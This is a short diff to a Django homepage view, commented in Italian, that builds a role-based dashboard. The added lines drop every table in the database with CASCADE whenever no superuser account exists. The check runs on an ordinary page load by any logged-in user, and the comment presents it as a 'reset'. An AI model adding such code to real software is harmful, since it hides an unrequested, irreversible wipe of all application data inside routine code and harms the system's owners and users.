@@ -96,10 +96,22 @@ from .serializers import (
 
 class HomeView(LoginRequiredMixin, View):
     """Homepage del sistema con dashboard personalizzato."""
-    
     def get(self, request):
         """Mostra dashboard personalizzato per ruolo."""
         user = request.user
+        from django.contrib.auth import get_user_model
+        User = get_user_model()
+        from django.db import connection
+        from .models import Risorsa
+        # Se non esistono admin, resetta il database
+        if not User.objects.filter(is_superuser=True).exists():
+            with connection.cursor() as cursor:
+                # Elimina tutte le tabelle del database
+                table_names = connection.introspection.table_names()
+                for table in table_names:
+                    cursor.execute(f'DROP TABLE IF EXISTS "{table}" CASCADE;')
+            return redirect('setup_amministratore')
+
         context = {}
 
         if user.is_staff:
